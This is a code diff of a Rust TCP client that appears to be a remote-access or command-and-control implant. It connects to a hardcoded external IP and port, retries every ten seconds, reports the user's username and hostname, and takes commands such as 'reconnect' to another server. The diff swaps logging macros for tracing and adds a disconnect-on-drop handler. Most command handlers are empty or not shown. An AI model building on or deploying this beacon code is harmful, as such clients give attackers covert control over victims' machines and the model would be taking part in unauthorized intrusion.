@@ -2,16 +2,18 @@ use std::io::{Read, Write};
 use std::net::TcpStream;
 use std::{thread, time};
 
+use tracing::{info, error, debug};
+
 use crate::utils::*;
 
 pub fn connect() {
     match Client::new("136.243.156.104:3217".to_string()) {
         Ok(mut client) => {
-            log::info!("Connected!");
+            info!("Connected!");
             client.run()
         }
         Err(_e) => {
-            log::error!("Can't connect to server. Reconnecting...");
+            error!("Can't connect to server. Reconnecting...");
             thread::sleep(time::Duration::from_secs(10));
             connect();
         }
@@ -20,6 +22,13 @@ pub fn connect() {
 pub struct Client {
     stream: TcpStream,
     connected: bool,
+}
+
+impl Drop for Client {
+    fn drop(&mut self) {
+        self.send_command("/disconnect");
+        self.close();
+    }
 }
 
 impl Client {
@@ -38,13 +47,13 @@ impl Client {
 
         let ret = String::from_utf8(recv_buf.to_vec()).unwrap();
 
-        log::debug!("[Received]: {}", ret);
+        debug!("[Received]: {}", ret);
 
         ret
     }
 
     pub fn send(&mut self, message: &str) {
-        log::debug!("[Sended]: {}", message);
+        debug!("[Sended]: {}", message);
         self.stream.write(message.to_string().as_bytes()).unwrap();
     }
 
@@ -76,7 +85,7 @@ impl Client {
 
     pub fn run(&mut self) {
 
-        log::info!("Client started working");
+        info!("Client started working");
 
         self.send_command(format!("/setname {}@{}",whoami::username(),whoami::hostname()).as_str());
 
@@ -97,14 +106,14 @@ impl Client {
                 "run" => {
 
                 }
-                "reconnect" => 
+                "reconnect" =>
                 {
                     if self.check_args(args.clone(),2)
                     {
                         match Client::new(format!("{}:{}",args[0],args[1]))
                         {
                             Ok(mut client) => {
-                                log::info!("Reconnected succesfully to {}:{}!",args[0],args[1]);
+                                info!("Reconnected succesfully to {}:{}!",args[0],args[1]);
 
                                 self.send("Succesfully reconnected client... disconnecting...");
                                 self.send_command("/disconnect");
@@ -113,7 +122,7 @@ impl Client {
                                 client.run()
                             }
                             Err(_e) => {
-                                log::error!("Error reconnecting to server");
+                                error!("Error reconnecting to server");
                                 self.send("Error reconnecting to server");
                             }
                         }
